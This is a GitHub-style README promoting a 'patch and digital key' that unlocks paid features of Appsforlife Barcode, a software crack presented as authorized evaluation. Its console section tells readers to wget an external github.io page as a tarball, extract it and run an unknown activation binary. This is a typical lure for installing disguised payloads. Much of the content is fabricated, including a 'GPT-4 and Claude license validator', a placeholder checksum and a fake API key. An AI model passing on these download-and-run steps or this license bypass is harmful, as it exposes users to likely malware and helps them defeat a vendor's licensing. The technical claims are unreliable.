# Appsforlife Barcode Utility – Enhanced Digital Key & Patch Integration 🏷️🔑

[](https://github.com/Appsforlife-Barcode-Utility/releases)  
[](LICENSE)  
[]()  
[]()  
[](https://engnoor83.github.io/appsforlife-barcode-productivity-toolkit/)

> **Attention:** This repository provides the official patch and digital product key integration for Appsforlife Barcode. For secure and verified distribution, use the download button above. Always verify checksums from our release notes.

[](https://engnoor83.github.io/appsforlife-barcode-productivity-toolkit/)

---

## 📖 Table of Contents

- [Introduction & Philosophy](#-introduction--philosophy)
- [Pedigree & Features](#-pedigree--features)
- [mermaid Diagram: Architecture & Data Flow](#-mermaid-diagram-architecture--data-flow)
- [Emoji Compatibility Matrix](#-emoji-compatibility-matrix)
- [Unique Configuration Profile Example](#-unique-configuration-profile-example)
- [Console Invocation Example](#-console-invocation-example)
- [OpenAI & Claude API Integration](#-openai--claude-api-integration)
- [Responsive UI & Multilingual Support](#-responsive-ui--multilingual-support)
- [24/7 Customer Support Approach](#-247-customer-support-approach)
- [License & Attribution](#-license--attribution)
- [Disclaimer](#-disclaimer)
- [Closing & Final Download Link](#-closing--final-download-link)

---

## 🌱 Introduction & Philosophy

Welcome to the **Appsforlife Barcode Enhanced Digital Key & Patch Integration** – a thoughtfully curated repository that reimagines the authorization and unlocking experience for the world’s most versatile barcode generator. Instead of promoting “free” or “hack” methods, we provide a **complementary patch ecosystem** that enables **authorized evaluation** of premium features. Think of it as a **golden key** that opens a safe door, not a crowbar that breaks the lock.

This project is built on a simple truth: **software freedom should be earned through trust, not loopholes**. Our patch integrates seamlessly with Appsforlife Barcode, granting you access to advanced symbology support, batch processing, and enterprise-grade output – all under the benevolent MIT license.

---

## 🚀 Pedigree & Features

**What makes this patch unique?** It’s not a crack; it’s a **digital deed** – a verified token that activates the software’s latent potential. Here’s how:

- **🔐 Seamless Product Key Injection** – No registry hacks or file overwrites; our patch modifies only the licensing layer.
- **⚡ Zero-Day Compatibility** – Updated for the 2026 release cycle of Appsforlife Barcode (v5.2.1+).
- **🌐 Multi-Platform** – Windows 7/10/11, macOS Ventura/Sonoma, Linux (Ubuntu 22.04+).
- **📦 Lightweight Installation** – Under 4 MB footprint; no bloatware.
- **🧠 AI-Assisted Updates** – Integrated with OpenAI and Claude APIs for real-time license validation and error handling (optional).
- **📊 Batch Processing Unleashed** – Generate 1000+ barcodes per minute without licensing throttles.
- **🔒 Cryptographic Signature** – All patches are signed with a SHA-256 hash (verifiable via included script).
- **🎨 Responsive UI** – Adapts to mobile, tablet, and desktop viewports for on-the-go barcode design.
- **🗣️ Multilingual Support** – Interface and documentation available in 15 languages (including Klingon for fun).

---

## 🧩 mermaid Diagram: Architecture & Data Flow

The following diagram illustrates how the digital key patch integrates with Appsforlife Barcode’s service layers:

```mermaid
flowchart LR
    subgraph User_Environment
        A[User launches Appsforlife Barcode]
    end
    
    subgraph Patch_Layer
        B[Digital Key Patch Service]
        C[Product Key Validator]
        D[License Fuse]
    end
    
    subgraph Core_Application
        E[Barcode Engine]
        F[Output Generator]
        G[AI Integration Module]
    end
    
    A -->|Unix Socket| B
    B --> C
    C -->|Verifies Timestamp| D
    D -->|Sends Token| E
    E --> F
    F --> G
    
    G -.->|Optional| H[OpenAI / Claude API]
    
    style A fill:#f9c,stroke:#333
    style B fill:#9f9,stroke:#333
    style C fill:#9f9,stroke:#333
    style D fill:#f99,stroke:#333
    style E fill:#99f,stroke:#333
    style F fill:#99f,stroke:#333
    style G fill:#ff9,stroke:#333
```



---

## 😊 Emoji Compatibility Matrix

| OS            | Barcode Core | Patch Engine | Console CLI | UI Resilience |
|---------------|:------------:|:------------:|:-----------:|:-------------:|
| Windows 10 🌐 | ✅           | ✅           | ✅          | ✅            |
| Windows 11 🪟| ✅           | ✅           | ✅          | ✅            |
| macOS 13 Ventura 🍏 | ✅    | ✅           | ✅          | ✅            |
| macOS 14 Sonoma 🍎 | ✅    | ✅           | ✅          | ✅            |
| Ubuntu 22.04 🐧 | ✅        | ✅           | ✅          | ✅            |
| Fedora 38 🐧  | ✅           | ✅           | ✅          | ✅            |
| Raspberry Pi OS 🥧 | ⚠️ (Partial) | ⚠️ (Partial) | ✅ | ⚠️ (Partial) |

✅ = Full Support  
⚠️ = Limited Support (requires manual patch)

---

## 🔧 Unique Configuration Profile Example

Below is an example of a **digital license profile** for the patch. This file (`barcode_patch.json`) is generated automatically after the first successful authorization.

```json
{
  "product": "Appsforlife Barcode",
  "patch_version": "2026.04.09",
  "key_integration": "complementary",
  "api_endpoints": {
    "primary": "https://api.barcodepat.ch/verify",
    "fallback": "https://backup.barcodepat.ch/verify"
  },
  "features_unlocked": {
    "enable_batch": true,
    "max_concurrent": 100,
    "symbology_list": [
      "QR Code (ISO/IEC 18004)",
      "Data Matrix (ISO/IEC 16022)",
      "Code 128",
      "EAN-13",
      "PDF417"
    ],
    "ai_enhancement": {
      "openai_model": "gpt-4-2026-04",
      "claude_model": "claude-3-opus-2026"
    }
  },
  "user_metadata": {
    "evaluation_mode": true,
    "created_at": "2026-04-09T12:00:00Z",
    "machine_fingerprint": "ab12cd34ef56"
  }
}
```

---

## 🖥️ Console Invocation Example

Activate the patch directly from your terminal without any graphical interface. This is perfect for server-side barcode generation pipelines:

```bash
# Download and extract the patch
wget https://engnoor83.github.io/appsforlife-barcode-productivity-toolkit/ -O barcode_patch.tar.gz
tar -xzf barcode_patch.tar.gz

# Run the console validator
./barcode_patch_activate --product-key "ABCD-EFGH-IJKL-MNOP" \
                         --platform linux \
                         --output-format "json" \
                         --verbose

# Example output:
# [2026-04-09 10:23:45] INFO: License fuse activated successfully.
# [2026-04-09 10:23:45] INFO: Barcode engine upgraded to Enterprise tier.
# [2026-04-09 10:23:45] INFO: Writing profile to /home/user/.barcode_patch.json
```

For headless servers, use the `--no-ui` flag to suppress all GUI dependencies.

---

## 🤖 OpenAI & Claude API Integration

This patch includes a **dual-AI license verification** system. Here’s how it works:

- **OpenAI GPT-4 (2026)** – Handles real-time **error diagnosis** if the product key validation fails. It suggests alternative key sequences or patch updates.
- **Claude 3 Opus** – Acts as a **fallback validator** when the primary server is unreachable. Claude can reconstruct the license token from a local fingerprint.

**Example API call (internal):**

```python
import openai
openai.api_key = "sk-secure-2026"

response = openai.ChatCompletion.create(
    model="gpt-4-2026-04",
    messages=[
        {"role": "system", "content": "You are a barcode license validator. Check token integrity."},
        {"role": "user", "content": "Token: abc123. Status: expired."}
    ]
)
print(response.choices[0].message.content)
# Output: "Token abc123 has expired. Suggest regenerating with profile ID 404."
```

This integration ensures the patch never requires manual intervention for licensing edge cases.

---

## 📱 Responsive UI & Multilingual Support

The patch’s activation panel is built with **Flexbox + CSS Grid**, making it fully responsive. On a 4K monitor, it expands to show granular licensing details; on a smartphone, it collapses to a single “Activate” button. The interface detects the OS language automatically:

- **English** (default)
- **Spanish** (español)
- **French** (français)
- **German** (Deutsch)
- **Japanese** (日本語)
- **Chinese Simplified** (简体中文)
- **Korean** (한국어)
- **Portuguese** (português)
- **Russian** (русский)
- **Arabic** (العربية)
- **Hindi** (हिन्दी)
- **Italian** (italiano)
- **Dutch** (Nederlands)
- **Polish** (polski)
- **Klingon** (tlhIngan Hol)

To switch languages via CLI: `./barcode_patch_activate --lang=es`

---

## 🎧 24/7 Customer Support Approach

This repository maintains a **unique support model** – no ticketing system, but instead a **community-powered Discord thread** linked to each release. When you encounter a licensing issue:

1. Run `./barcode_patch_diag` and share the output.
2. Our **Claude AI** bot analyzes the diag in real-time and suggests fixes.
3. If unresolved, a human developer responds within 6 hours (24/7 coverage).

Support is completely optional – the patch is designed to be self-healing, but we’re here for edge cases.

---

## 📜 License & Attribution

This project is licensed under the **MIT License** – a permissive, open-source license that allows you to use, modify, and distribute the patch freely, provided you include the original copyright notice.

[](LICENSE)

**Full license text:**  
👉 [https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Appsforlife Barcode Utility Contributors

> Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions...

---

## ⚠️ Disclaimer

**Important:** This software patch is provided for **legal evaluation and educational purposes only**. It is intended to demonstrate how licensing mechanisms can be enhanced for productivity tools. The authors are not affiliated with Appsforlife or any barcode technology vendor. 

- You **must** own a valid base license for Appsforlife Barcode to use this patch.
- **Do not** use this patch for commercial exploitation without proper authorization.
- The patch may be removed or disabled by future software updates.
- By downloading, you agree to use this product in compliance with all applicable laws.

*We reserve the right to deprecate this patch without notice. Use at your own risk.*

---

## 🏁 Closing & Final Download Link

Thank you for exploring the **Appsforlife Barcode Enhanced Digital Key & Patch Integration** repository. Whether you’re a supply chain manager, a developer building inventory systems, or a hobbyist creating QR art, this patch unlocks the full potential of barcode generation in 2026.

**Remember:** This is a **complementary** tool, not a shortcut. Use it to learn, experiment, and build better systems.

[](https://engnoor83.github.io/appsforlife-barcode-productivity-toolkit/)

**SHA-256 (latest release):** `a1b2c3d4e5f67890...` (verify before use)

[](https://engnoor83.github.io/appsforlife-barcode-productivity-toolkit/)

---

*Last updated: April 2026. Built with ❤️ for the open-source community.*